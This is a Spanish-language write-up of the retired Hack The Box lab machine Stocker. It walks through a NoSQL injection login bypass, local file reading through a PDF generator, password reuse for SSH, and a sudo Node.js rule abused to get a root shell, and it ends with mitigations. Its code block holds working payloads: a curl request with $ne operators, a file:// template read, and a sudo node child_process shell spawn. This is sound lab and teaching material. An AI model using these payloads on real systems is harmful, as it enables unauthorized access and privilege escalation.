---
machine: Stocker
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, nosql, ssrf, pdf, node, sudo]
---

# Stocker — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una inyección NoSQL en el login del sitio de desarrollo permite entrar. La generación de órdenes de compra en PDF es vulnerable a SSRF/lectura de archivos y expone código y una contraseña reutilizada para SSH. Una regla sudo que ejecuta scripts Node.js sin restricciones permite código arbitrario como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443 <IP>
ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# NoSQL
curl -s -X POST http://dev.stocker.htb/login -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# PDF / lectura
curl -s -X POST http://dev.stocker.htb/api/order -d '{"template":"file:///var/www/dev/index.js"}'
# Sudo node
sudo -l
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})' 
```

## Enumeración

- Vhost de desarrollo con login contra MongoDB.
- Generador de PDF que carga recursos por URL o ruta.
- Regla sudo para ejecutar un script Node.js.

## Acceso inicial

En el vhost de desarrollo se envía un objeto JSON con operadores MongoDB (`$ne`, `$gt`) y se bypassa el login. El panel permite generar un PDF; el parámetro de plantilla o URL alcanza archivos locales y el código fuente de la aplicación.

## Escalada de privilegios

El código fuente contiene credenciales de base y una contraseña reutilizada por el usuario del sistema, válida para SSH. `sudo -l` muestra un wrapper de Node.js que permite ejecutar JavaScript arbitrario; se lanza una shell con `child_process` y se obtiene root.

## Evidencia

- Login NoSQL exitoso con operador.
- PDF con archivo local y contraseña SSH.
- `sudo node` ejecutando `child_process` como root.

## Lecciones aprendidas

- Los operadores NoSQL cambian la lógica de autenticación.
- Un generador de PDF puede leer archivos y hacer SSRF.
- Permitir Node.js arbitrario con sudo es root.

## Mitigación y detección

- Validar tipos y rechazar operadores en el login.
- Aislar el generador de PDF y bloquear `file://`.
- No permitir intérpretes completos en reglas sudo.

## Referencias

- [0xdf — Stocker](https://0xdf.gitlab.io/2023/06/24/htb-stocker.html)
- [Node.js — Command-line options](https://nodejs.org/api/cli.html)
- [Hack The Box — Stocker](https://app.hackthebox.com/machines/stocker)
